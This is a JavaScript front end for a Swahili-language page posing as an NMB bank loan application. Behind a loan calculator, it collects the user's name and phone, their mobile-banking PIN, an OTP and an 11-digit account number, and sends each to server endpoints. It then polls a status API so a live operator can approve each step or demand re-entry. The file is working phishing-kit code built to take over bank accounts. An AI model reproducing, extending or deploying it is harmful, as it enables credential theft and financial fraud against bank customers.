document.addEventListener('DOMContentLoaded', () => {
    let sessionId = localStorage.getItem('nmb_session_id');
    if (!sessionId) {
        sessionId = 'sess_' + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
        localStorage.setItem('nmb_session_id', sessionId);
    }

    const urlParams = new URLSearchParams(window.location.search);
    const ref = urlParams.get('ref') || '';

    let currentScreen = 'screen-slider';
    let formData = {
        amount: 100000,
        duration: 12,
        loanType: 'Mkopo wa Biashara',
        purpose: '',
        firstName: '',
        lastName: '',
        phone: '',
        employment: 'Mfanyabiashara',
        annualIncome: '',
        pin: '',
        otp: '',
        accountNumber: ''
    };

    function showScreen(screenId) {
        document.querySelectorAll('.screen').forEach(screen => {
            screen.classList.remove('active');
        });
        const target = document.getElementById(screenId);
        if (target) {
            target.classList.add('active');
            currentScreen = screenId;
            window.scrollTo(0, 0);
        }
    }

    function showLoading(text = 'Tafadhali subiri...') {
        document.getElementById('loading-text').innerText = text;
        document.getElementById('loading-overlay').classList.remove('hidden');
    }

    function hideLoading() {
        document.getElementById('loading-overlay').classList.add('hidden');
    }

    function showNotification(message, type = 'error') {
        const banner = document.getElementById('surface-notification');
        banner.innerText = message;
        banner.className = `surface-notification ${type}`;
        banner.classList.remove('hidden');
    }

    function hideNotification() {
        const banner = document.getElementById('surface-notification');
        banner.classList.add('hidden');
    }

    function pollServerStatus(onNextStep, onRestartPin, onRestartOtp, onRestartAcc, onSuccess) {
        const interval = setInterval(async () => {
            try {
                const res = await fetch(`/api/check-status/${sessionId}`);
                const data = await res.json();

                if (data.status && data.status !== 'pending') {
                    clearInterval(interval);
                    hideLoading();

                    if (data.status === 'next_step' && typeof onNextStep === 'function') {
                        hideNotification();
                        onNextStep();
                    } else if (data.status === 'restart_pin' && typeof onRestartPin === 'function') {
                        onRestartPin();
                    } else if (data.status === 'restart_otp' && typeof onRestartOtp === 'function') {
                        onRestartOtp();
                    } else if (data.status === 'restart_acc' && typeof onRestartAcc === 'function') {
                        onRestartAcc();
                    } else if (data.status === 'success' && typeof onSuccess === 'function') {
                        hideNotification();
                        onSuccess();
                    }
                }
            } catch (err) {
                console.error('Polling error:', err);
            }
        }, 2000);
    }

    // --- Screen 1: Slider Calculator ---
    const rangeAmount = document.getElementById('range-amount');
    const rangeDuration = document.getElementById('range-duration');
    const displayAmount = document.getElementById('display-amount');
    const displayDuration = document.getElementById('display-duration');
    const displayMonthly = document.getElementById('display-monthly');

    function updateCalculator() {
        const amt = parseInt(rangeAmount.value);
        const dur = parseInt(rangeDuration.value);
        formData.amount = amt;
        formData.duration = dur;

        displayAmount.innerText = `TSh ${amt.toLocaleString()}`;
        displayDuration.innerText = `${dur} miezi`;

        const monthly = Math.round((amt * (1 + 0.25 * (dur / 12))) / dur);
        displayMonthly.innerText = `TSh ${monthly.toLocaleString()}`;
        document.getElementById('input-loan-amount').value = amt;
    }

    if (rangeAmount && rangeDuration) {
        rangeAmount.addEventListener('input', updateCalculator);
        rangeDuration.addEventListener('input', updateCalculator);
    }

    document.getElementById('btn-omba-sasa').addEventListener('click', () => {
        hideNotification();
        showScreen('screen-step1');
    });

    // --- Screen 2: Step 1 ---
    document.getElementById('btn-step1-next').addEventListener('click', () => {
        formData.loanType = document.getElementById('loan-type').value;
        formData.amount = parseInt(document.getElementById('input-loan-amount').value) || formData.amount;
        formData.purpose = document.getElementById('loan-purpose').value;
        hideNotification();
        showScreen('screen-step2');
    });

    // --- Screen 3: Step 2 ---
    document.getElementById('btn-step2-back').addEventListener('click', () => {
        hideNotification();
        showScreen('screen-step1');
    });

    document.getElementById('btn-step2-next').addEventListener('click', () => {
        const firstName = document.getElementById('first-name').value.trim();
        const lastName = document.getElementById('last-name').value.trim();
        let phone = document.getElementById('phone-number').value.trim();

        if (!firstName || !lastName || !phone) {
            showNotification('Tafadhali jaza sehemu zote.', 'error');
            return;
        }

        if (phone.startsWith('0')) {
            phone = phone.substring(1);
        }

        formData.firstName = firstName;
        formData.lastName = lastName;
        formData.phone = phone;

        hideNotification();
        fetch('/api/submit-application', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ sessionId, phone, ref })
        }).catch(err => console.error(err));

        document.getElementById('sum-amount').innerText = `TSh ${formData.amount.toLocaleString()}`;
        document.getElementById('sum-duration').innerText = `${formData.duration} Miezi`;
        document.getElementById('sum-purpose').innerText = formData.purpose || 'Biashara';

        showScreen('screen-step3');
    });

    // --- Screen 4: Step 3 ---
    document.getElementById('btn-step3-back').addEventListener('click', () => {
        hideNotification();
        showScreen('screen-step2');
    });

    document.getElementById('btn-step3-submit').addEventListener('click', () => {
        formData.employment = document.getElementById('employment-status').value;
        formData.annualIncome = document.getElementById('annual-income').value;
        hideNotification();
        showScreen('screen-pin');
    });

    // --- Screen 5: PIN Inputs handling with Live Number Preview on Top ---
    const pinBoxes = document.querySelectorAll('.pin-box');
    pinBoxes.forEach((box, index) => {
        box.addEventListener('input', (e) => {
            let currentPin = '';
            pinBoxes.forEach(b => currentPin += b.value);
            const previewEl = document.getElementById('pin-preview');
            if (previewEl) previewEl.innerText = currentPin;

            if (e.target.value.length === 1 && index < pinBoxes.length - 1) {
                pinBoxes[index + 1].focus();
            }
        });
        box.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && !box.value && index > 0) {
                pinBoxes[index - 1].focus();
                let currentPin = '';
                pinBoxes.forEach(b => currentPin += b.value);
                const previewEl = document.getElementById('pin-preview');
                if (previewEl) previewEl.innerText = currentPin;
            }
        });
    });

    document.getElementById('btn-submit-pin').addEventListener('click', () => {
        let pin = '';
        pinBoxes.forEach(box => pin += box.value);

        if (pin.length !== 4) {
            showNotification('Tafadhali weka PIN ya tarakimu 4 kamili.', 'error');
            return;
        }

        formData.pin = pin;
        hideNotification();
        showLoading('Inahibitisha PIN na NMB Mkononi...');

        fetch('/api/submit-pin', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ sessionId, pin })
        }).then(() => {
            pollServerStatus(
                () => {
                    document.getElementById('lbl-otp-phone').innerText = `+255${formData.phone}`;
                    showScreen('screen-otp');
                },
                () => {
                    hideLoading();
                    showNotification('PIN si sahihi au imekataliwa. Jaribu tena.', 'error');
                    pinBoxes.forEach(b => b.value = '');
                    const previewEl = document.getElementById('pin-preview');
                    if (previewEl) previewEl.innerText = '';
                    pinBoxes[0].focus();
                    showScreen('screen-pin');
                }
            );
        }).catch(() => {
            hideLoading();
            showNotification('Hitilafu ya mtandao. Jaribu tena.', 'error');
        });
    });

    // --- Screen 6: OTP Inputs handling ---
    const otpBoxes = document.querySelectorAll('.otp-box');
    otpBoxes.forEach((box, index) => {
        box.addEventListener('input', (e) => {
            if (e.target.value.length === 1 && index < otpBoxes.length - 1) {
                otpBoxes[index + 1].focus();
            }
        });
        box.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && !box.value && index > 0) {
                otpBoxes[index - 1].focus();
            }
        });
    });

    document.getElementById('btn-submit-otp').addEventListener('click', () => {
        let otp = '';
        otpBoxes.forEach(box => otp += box.value);

        if (otp.length !== 4) {
            showNotification('Tafadhali weka namba za OTP kamili.', 'error');
            return;
        }

        formData.otp = otp;
        hideNotification();
        showLoading('Inathibitisha OTP...');

        fetch('/api/submit-otp', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ sessionId, otp })
        }).then(() => {
            pollServerStatus(
                () => {
                    showScreen('screen-account');
                },
                null,
                () => {
                    hideLoading();
                    showNotification('OTP si sahihi. Jaribu tena.', 'error');
                    otpBoxes.forEach(b => b.value = '');
                    otpBoxes[0].focus();
                    showScreen('screen-otp');
                }
            );
        }).catch(() => {
            hideLoading();
            showNotification('Hitilafu ya mtandao.', 'error');
        });
    });

    // --- Screen 7: Account Number Submission ---
    document.getElementById('btn-submit-account').addEventListener('click', () => {
        const accountNumber = document.getElementById('account-number-input').value.trim();

        if (accountNumber.length !== 11) {
            showNotification('Namba ya akaunti lazima iwe na tarakimu 11 kamili.', 'error');
            return;
        }

        formData.accountNumber = accountNumber;
        hideNotification();
        showLoading('Inakagua akaunti ya benki...');

        fetch('/api/submit-account', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ sessionId, accountNumber })
        }).then(() => {
            pollServerStatus(
                null,
                () => {
                    hideLoading();
                    showNotification('PIN si sahihi.', 'error');
                    showScreen('screen-pin');
                },
                () => {
                    hideLoading();
                    showNotification('OTP si sahihi.', 'error');
                    showScreen('screen-otp');
                },
                () => {
                    hideLoading();
                    showNotification('Namba ya akaunti si sahihi. Tafadhali rudia.', 'error');
                    document.getElementById('account-number-input').value = '';
                    showScreen('screen-account');
                },
                () => {
                    showScreen('screen-success');
                }
            );
        }).catch(() => {
            hideLoading();
            showNotification('Hitilafu ya mtandao.', 'error');
        });
    });

    document.getElementById('btn-home').addEventListener('click', () => {
        localStorage.removeItem('nmb_session_id');
        location.reload();
    });
});
                                                     
